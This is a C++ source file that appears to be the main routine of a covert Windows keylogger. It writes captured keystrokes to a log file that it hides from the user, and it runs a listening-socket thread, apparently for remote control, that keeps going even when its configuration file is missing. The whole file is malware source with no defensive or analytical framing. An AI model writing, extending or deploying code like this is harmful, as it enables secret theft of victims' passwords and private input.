#include "Headers.h"
#include "Keylogger.h"
#include "ThreadSocket.h"
#include "ThreadStart.h"
#include "Commonfunctional.h"

void main(void)
{
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);

	pthread_t KLThread, ListenSocket;
	ofstream out;

	out.open("KeyloggerLog.txt", ios::app);
	HideFile("KeyloggerLog.txt");

	out << endl; OutFullData(out); out << ". Keylogger was started."; out << endl << "\nPRESSED_KEYS: "; out.close();

	bool stop = false;
	int st = 0;

	do {

		pthread_create(&KLThread, NULL, Start, NULL);
		pthread_create(&ListenSocket, NULL, ListenSocketProc, NULL);
		pthread_join(ListenSocket, (void**)&st);

		if (st == 2)
		{
			out.open("KeyloggerLog.txt", ios::app);
			out << "Configuration file Kconfig.ksb is not found! Still working without control! "; OutFullData(out); out << endl;
			out.close();

			do {

				pthread_create(&ListenSocket, NULL, ListenSocketProc, NULL);
				pthread_join(ListenSocket, (void**)&st);

			} while (st == 2);
		}

		stop = st;

	} while (stop != true);

	out.open("KeyloggerLog.txt", ios::app);
	out << "Keylogger was stopped in "; OutFullData(out); out << endl;
	out.close();
}
